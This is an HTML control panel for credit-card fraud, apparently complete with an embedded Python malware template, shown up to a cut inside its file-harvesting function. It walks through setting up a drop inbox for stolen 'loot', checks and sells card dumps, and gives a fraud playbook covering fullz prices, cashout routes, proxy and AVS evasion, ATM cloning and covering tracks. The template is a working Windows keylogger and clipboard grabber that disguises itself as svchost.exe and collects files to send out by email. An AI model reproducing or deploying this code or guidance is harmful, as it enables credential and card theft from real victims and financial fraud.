<body>
<header>
  <h1>MASTERMIND <small>// local build</small></h1>
  <nav>
    <button data-t="build" class="on">BUILD</button>
    <button data-t="drop">DROP</button>
    <button data-t="track">TRACK</button>
    <button data-t="play">PLAY</button>
    <button data-t="opsec">OPSEC</button>
  </nav>
</header>
<main>

<section id="build" class="on">
  <p class="hint">One drop address per campaign. Credentials live only in this phone's storage and in the exe you build.</p>
  <label>Drop address (where packages land)</label>
  <input id="drop" placeholder="youdrop@gmail.com" autocomplete="off" spellcheck="false">
  <label>Sender address (usually the same)</label>
  <input id="smtpUser" placeholder="youdrop@gmail.com" autocomplete="off" spellcheck="false">
  <label>App password (16 chars, not your account password)</label>
  <input id="smtpPw" placeholder="xxxxxxxxxxxxxxxx" autocomplete="off" spellcheck="false">
  <label>Zip password (you need this to open every package)</label>
  <input id="zipPw" placeholder="four random words" autocomplete="off">
  <label>Hardened mode (optional) &mdash; Cloudflare Worker URL</label>
  <input id="worker" placeholder="https://xxx.workers.dev" autocomplete="off" spellcheck="false">
  <label>Worker HMAC secret</label>
  <input id="secret" placeholder="long random string" autocomplete="off" spellcheck="false">
  <button class="b" onclick="gen()">GENERATE agent.py</button>
  <button class="b g" onclick="testWorker()">TEST PIPELINE</button>
  <button class="b g" onclick="genWorker()">DOWNLOAD worker.js</button>
  <button class="b g" onclick="wipe()">CLEAR SAVED CONFIG</button>
  <p class="hint">See the DROP tab before building. Generate, push to GitHub, let Actions build the exe.</p>
</section>

<section id="drop">
  <p class="hint">One dedicated inbox. Never your main address.</p>
  <details><summary>1. Create the drop inbox</summary><div class="in">
    <ol>
      <li>New Gmail, used for nothing else. Sign out of your personal account first.</li>
      <li>Turn on <b>2-Step Verification</b> &mdash; app passwords require it.</li>
      <li>Security &rarr; <b>App passwords</b> &rarr; name it <code>agent</code> &rarr; copy the 16 characters.</li>
      <li>Save the 2FA backup codes somewhere off the phone.</li>
    </ol>
  </div></details>
  <details><summary>2. Filter the packages out of the main view</summary><div class="in">
    <ol>
      <li>Gmail app &rarr; search &rarr; paste exactly: <code>subject:([SYS-</code> &rarr; enter.</li>
      <li>Search options &rarr; <b>Create filter</b>.</li>
      <li>Tick <b>Apply the label</b> &rarr; New label &rarr; <code>loot</code>.</li>
      <li>Tick <b>Never send it to Spam</b> and <b>Mark as read</b>. Create filter.</li>
    </ol>
  </div></details>
  <details><summary>3. Handling packages</summary><div class="in">
    <ul>
      <li>Open the <code>loot</code> label &rarr; tap package &rarr; Download.</li>
      <li>ZArchiver &rarr; extract &rarr; enter your zip password.</li>
      <li>Delete the mail after extracting. Gmail gives 15 GB and fullz packages are heavy.</li>
      <li>Split packages (<code>part01of03</code>) need Termux: <code>cat *.part* &gt; loot.zip</code>, then extract.</li>
      <li>Never forward a package onward &mdash; the password never travels with it.</li>
    </ul>
  </div></details>
  <details><summary>Troubleshooting</summary><div class="in">
    <ul>
      <li><span class="bad">Nothing arrives</span> &mdash; check Spam and the filter, confirm the exe ran at all.</li>
      <li><span class="bad">Bounces</span> &mdash; package exceeded 25 MB. Lower the document budget.</li>
      <li><span class="bad">"Authentication failed"</span> &mdash; wrong app password, or 2FA is off.</li>
      <li><span class="warn">Mail but no attachment</span> &mdash; Gmail stripped it. Confirm it is a password-protected zip.</li>
    </ul>
  </div></details>
</section>

<section id="track">
  <p class="hint">Paste a dump, one card per line. Pipe, colon, tab or double-space separated. Luhn-checked, deduped, BIN-tagged.</p>
  <textarea id="batchIn" placeholder="4111111111111111|09|28|123|JOHN DOE|12 OAK ST|AUSTIN|TX|78701|US"></textarea>
  <div class="mrow">
    <button class="b small" onclick="addBatch()">ADD BATCH</button>
    <button class="b g small" onclick="$('#batchIn').value=''">CLEAR</button>
  </div>

  <label>BIN enrichment API (optional)</label>
  <input id="binapi" placeholder="https://lookup.binlist.net/{bin}" autocomplete="off" spellcheck="false">

  <div class="stats" id="stats"></div>
  <div class="chips" id="chips"></div>
  <div id="feed2"></div>

  <details><summary>Non-VBV BIN list</summary><div class="in">
    <p>One BIN per line, 6 or 8 digits. Cards matching get a green tag and sort to the top.</p>
    <textarea id="binIn" placeholder="414720&#10;448540"></textarea>
    <button class="b g small" onclick="saveBins()">SAVE LIST</button>
  </div></details>

  <details><summary>Export</summary><div class="in">
    <button class="b g small" onclick="expCsv()">CSV (full data)</button>
    <button class="b g small" onclick="expDump()">SELL DUMP (live only)</button>
    <button class="b g small" onclick="expStates()">PROXY TARGETS (states)</button>
    <p class="hint">Sell dump is pipe-delimited and excludes dead or spent cards.</p>
  </div></details>

  <details><summary>Housekeeping</summary><div class="in">
    <button class="b g small" onclick="purge('dead')">PURGE DEAD</button>
    <button class="b g small" onclick="purge('sold')">PURGE SOLD</button>
    <button class="b g small" onclick="if(confirm('wipe all cards?')){saveCards([]);render()}">WIPE ALL</button>
  </div></details>
</section>

<section id="play">
  <p class="hint">Read once, properly. Most losses are operator error, not bad data.</p>
  <details><summary>Data classes and what they actually trade for</summary><div class="in">
    <ul>
      <li><b>CC + exp + CVV only</b> &mdash; $1&ndash;8. Disposable.</li>
      <li><b>+ name / address / zip</b> &mdash; AVS-capable, $8&ndash;18.</li>
      <li><b>+ SSN / DOB / MMN</b> &mdash; full fullz, $15&ndash;40.</li>
      <li><b>+ email or bank login</b> &mdash; premium, beats OTP.</li>
      <li><b>Session cookies</b> &mdash; highest value, skips 3DS entirely.</li>
      <li><b>Non-VBV / auto-VBV BIN</b> &mdash; the only thing that matters for volume.</li>
    </ul>
  </div></details>
  <details><summary>Validation before you touch anything</summary><div class="in">
    <ul>
      <li><b>BIN lookup first.</b> 3DS-locked and no email means park it.</li>
      <li><b>Live check</b> &mdash; approved plus AVS response, not just approved.</li>
      <li><b>AVS</b> &mdash; full match or full non-avs only.</li>
      <li><b>Geo</b> &mdash; proxy state equals cardholder state.</li>
    </ul>
  </div></details>
  <details><summary>Cashout routes, easiest to hardest</summary><div class="in">
    <p><span class="tag">low value</span> <b>Gift cards</b> &mdash; instant, one shot, 40&ndash;60%.</p>
    <p><span class="tag">low risk</span> <b>Bill pay</b> &mdash; near-zero declines, thin margin.</p>
    <p><span class="tag">needs identity</span> <b>PayPal / Cash App</b> &mdash; warmed account plus fullz.</p>
    <p><span class="tag">high ticket</span> <b>Flights / hotels</b> &mdash; exact identity, non-refundable.</p>
    <p><span class="tag">best resale</span> <b>Physical goods to a drop</b> &mdash; 70&ndash;85%.</p>
    <p><span class="tag">hardware</span> <b>ATM clone</b> &mdash; needs MSR605X, best per-card return.</p>
  </div></details>
  <details><summary>Operating rules</summary><div class="in">
    <ul>
      <li><b>One card, one merchant, one session.</b></li>
      <li><b>Residential SOCKS5 in the cardholder's state.</b></li>
      <li><b>Fresh antidetect profile per card.</b></li>
      <li><b>Billing exactly as on file.</b></li>
      <li><b>Under $300</b> on an untested merchant.</li>
      <li><b>Two to four orders per hour</b> per IP block.</li>
    </ul>
  </div></details>
  <details><summary>Kill signals</summary><div class="in">
    <ul>
      <li>Three declines: card or IP dead, stop.</li>
      <li><span class="bad">Do not honor</span> &mdash; change proxy first.</li>
      <li><span class="warn">AVS mismatch</span> &mdash; move to an AVS-off merchant.</li>
      <li>Sudden OTP &mdash; BIN locked, park it.</li>
      <li>Checkout captcha &mdash; dirty profile, rebuild it.</li>
    </ul>
  </div></details>
  <details><summary>The 24-hour rule</summary><div class="in">
    <p>Half-life is hours on good BINs. Sort by BIN quality the moment a package lands and cash the top three inside the first hour. Sell the rest. Sell the first batch to fund proxies and checker credits.</p>
  </div></details>
</section>

<section id="opsec">
  <p class="hint">Tap to tick. Persists on this device only.</p>
  <div id="chk"></div>
  <hr>
  <div class="card"><h3>TRACK COVERING</h3>
    <ul>
      <li>Dedicated drop Gmail on a <b>second SIM</b>. Never your real number.</li>
      <li>App password, never the account password. Revoke after each campaign.</li>
      <li>Filter + <code>loot</code> label + never-to-spam before first deploy.</li>
      <li>Download, decrypt, delete. Gmail is transit, not your archive.</li>
      <li>Worker mode keeps the app password off the binary.</li>
      <li>Zip password stored outside email.</li>
      <li>2FA backup codes saved offline.</li>
    </ul>
  </div>
  <div class="card"><h3>PAYLOAD HYGIENE</h3>
    <ul>
      <li>One exe per campaign, never recycled.</li>
      <li>Fresh repo per campaign.</li>
      <li>Expect Defender flags &mdash; "More info &rarr; Run anyway".</li>
      <li>Check the VM flag in <code>info.json</code>.</li>
      <li>Keep the document budget under 10 MB.</li>
    </ul>
  </div>
</section>

</main>

<div class="sheet" id="sheet"><div class="box" id="box"></div></div>

<script type="text/plain" id="agentTpl">
#!/usr/bin/env python3
"""SysCache - blind collector. SMTP drop exfil, AES-256 packages, retry queue."""

import os, sys, time, json, random, shutil, socket, sqlite3, subprocess, threading
import base64, ctypes, ctypes.wintypes, hashlib, hmac, platform, urllib.request
import smtplib, ssl
from datetime import datetime
from email.message import EmailMessage

try:
    import pyzipper
except ImportError:
    pyzipper = None

CFG = {
    "drop":      "{{DROP}}",
    "smtp_user": "{{SMTP_USER}}",
    "smtp_pw":   "{{SMTP_PW}}",
    "worker":    "{{WORKER}}",
    "secret":    "{{SECRET}}",
    "zip_pw":    "{{ZIP_PW}}",
}

APPDATA      = os.environ.get("APPDATA", os.path.expanduser("~"))
LOCALAPPDATA = os.environ.get("LOCALAPPDATA", APPDATA)
INSTALL_DIR  = os.path.join(APPDATA, "SysCache")
INSTALL_EXE  = os.path.join(INSTALL_DIR, "svchost.exe")
WORK         = os.path.join(INSTALL_DIR, "w")
QUEUE        = os.path.join(INSTALL_DIR, "q")
LOG          = os.path.join(INSTALL_DIR, "svc.log")
NO_WIN       = 0x08000000
BUDGET       = [10 * 1024 * 1024]
LIMIT        = 15 * 1024 * 1024

_lock = threading.Lock()
_buf  = []

def log(m):
    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        with open(LOG, "a", encoding="utf-8", errors="ignore") as f:
            f.write("[%s] %s\n" % (datetime.now().strftime("%H:%M:%S"), m))
    except Exception:
        pass

def mid():
    raw = "%s|%s|%s" % (platform.node(), os.environ.get("USERNAME", ""), platform.machine())
    return hashlib.sha1(raw.encode()).hexdigest()[:8].upper()

def mutex(name):
    ctypes.windll.kernel32.CreateMutexW(None, False, name)
    return ctypes.windll.kernel32.GetLastError() != 183

def ps(cmd, timeout=45):
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                            "-Command", cmd], capture_output=True, text=True,
                           timeout=timeout, creationflags=NO_WIN)
        return (r.stdout or "") + (r.stderr or "")
    except Exception:
        return ""

# --------------------------------------------------------------- keyboard
SHIFT_MAP = {"1":"!","2":"@","3":"#","4":"$","5":"%","6":"^","7":"&","8":"*","9":"(",
             "0":")","-":"_","=":"+","[":"{","]":"}","\\":"|",";":":","'":'"',
             ",":"<",".":">","/":"?"}
SPECIAL = {8:"[BKSP]",9:"[TAB]",13:"[ENTER]",27:"[ESC]",46:"[DEL]",37:"[LEFT]",
           38:"[UP]",39:"[RIGHT]",40:"[DOWN]",35:"[END]",36:"[HOME]",33:"[PGUP]",
           34:"[PGDN]",45:"[INS]",20:"[CAPS]",0x5B:"[WIN]",0x5D:"[MENU]"}

def vk_to_str(vk):
    if 0x70 <= vk <= 0x87:
        return "[F%d]" % (vk - 0x6F)
    if vk in SPECIAL:
        return SPECIAL[vk]
    ch = ctypes.windll.user32.MapVirtualKeyW(vk, 2)
    if not ch:
        return ""
    ch = chr(ch)
    shifted = bool(ctypes.windll.user32.GetAsyncKeyState(0x10) & 0x8000)
    caps    = bool(ctypes.windll.user32.GetKeyState(0x14) & 1)
    if ch.isalpha():
        return ch.upper() if (shifted ^ caps) else ch.lower()
    if shifted:
        return SHIFT_MAP.get(ch, ch)
    return ch

class KB(ctypes.Structure):
    _fields_ = [("vk", ctypes.wintypes.DWORD), ("sc", ctypes.wintypes.DWORD),
                ("fl", ctypes.wintypes.DWORD), ("tm", ctypes.wintypes.DWORD),
                ("ex", ctypes.POINTER(ctypes.c_ulong))]

LRESULT  = ctypes.c_ssize_t
HOOKPROC = ctypes.WINFUNCTYPE(LRESULT, ctypes.c_int, ctypes.wintypes.WPARAM,
                              ctypes.wintypes.LPARAM)

def title():
    try:
        h = ctypes.windll.user32.GetForegroundWindow()
        n = ctypes.windll.user32.GetWindowTextLengthW(h)
        if n <= 0:
            return ""
        b = ctypes.create_unicode_buffer(n + 1)
        ctypes.windll.user32.GetWindowTextW(h, b, n + 1)
        return b.value[:120]
    except Exception:
        return ""

class Keylogger(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.cur = ""
        self.proc = HOOKPROC(self.cb)

    def cb(self, code, wp, lp):
        if code == 0 and wp in (0x100, 0x104):
            try:
                k = ctypes.cast(lp, ctypes.POINTER(KB)).contents
                t = title()
                with _lock:
                    if t != self.cur:
                        self.cur = t
                        _buf.append("\n\n--- [%s] ---\n" % t)
                    s = vk_to_str(k.vk)
                    if s:
                        _buf.append(s)
            except Exception:
                pass
        return ctypes.windll.user32.CallNextHookEx(None, code, wp, lp)

    def run(self):
        ctypes.windll.user32.SetWindowsHookExW(13, self.proc,
            ctypes.windll.kernel32.GetModuleHandleW(None), 0)
        m = ctypes.wintypes.MSG()
        while ctypes.windll.user32.GetMessageW(ctypes.byref(m), None, 0, 0) != 0:
            ctypes.windll.user32.TranslateMessage(ctypes.byref(m))
            ctypes.windll.user32.DispatchMessageW(ctypes.byref(m))

def drain():
    with _lock:
        s = "".join(_buf)
        _buf.clear()
    return s

def clip():
    last = ""
    while True:
        try:
            if ctypes.windll.user32.OpenClipboard(None):
                if ctypes.windll.user32.IsClipboardFormatAvailable(13):
                    h = ctypes.windll.user32.GetClipboardData(13)
                    p = ctypes.windll.kernel32.GlobalLock(h)
                    if p:
                        t = ctypes.wstring_at(p)
                        ctypes.windll.kernel32.GlobalUnlock(h)
                        if t and t != last:
                            last = t
                            with _lock:
                                _buf.append("\n[CLIP] %s\n" % t[:1500])
                ctypes.windll.user32.CloseClipboard()
        except Exception:
            pass
        time.sleep(1.0)

# ---------------------------------------------------------------- collect
def take(src, dd, cap=3 * 1024 * 1024):
    out = None
    try:
        if not os.path.isfile(src):
            return
        sz = os.path.getsize(src)
        if sz == 0 or sz > cap or sz > BUDGET[0]:
            return
        os.makedirs(dd, exist_ok=True)
        out = os.path.join(dd, os.path.basename(src))
        i = 1
        while os.path.exists(out):
            out = os.path.join(dd, "%s_%d" % (os.path.basename(src), i)); i += 1
        shutil.copy2(src, out)
        BUDGET[0] -= sz
    except Exception:
        if not out:
            return
        try:
            s = sqlite3.connect("file:%s?mode=ro" % src.replace("\\", "/"), uri=True, timeout=3)
            d = sqlite3.connect(out); s.backup(d); d.close(); s.close()
            BUDGET[0] -= os.path.getsize(out)
        except Exception:
            pass

def harvest():
    BUDGET[0] = 10 * 1024 * 1024
    d = os.path.join(WORK, datetime.now().strftime("%Y%m%d-%H%M%S"))
    os.makedirs(d, exist_ok=True)

    info = {"id": mid(), "host": platform.node(), "user": os.environ.get("USERNAME", ""),
            "os": platform.platform(), "arch": platform.machine(),
            "utc": datetime.utcnow().isoformat(), "lan": ""}
    try:
        info["lan"] = socket.gethostbyname(socket.gethostname())
    except Exception:
        pass
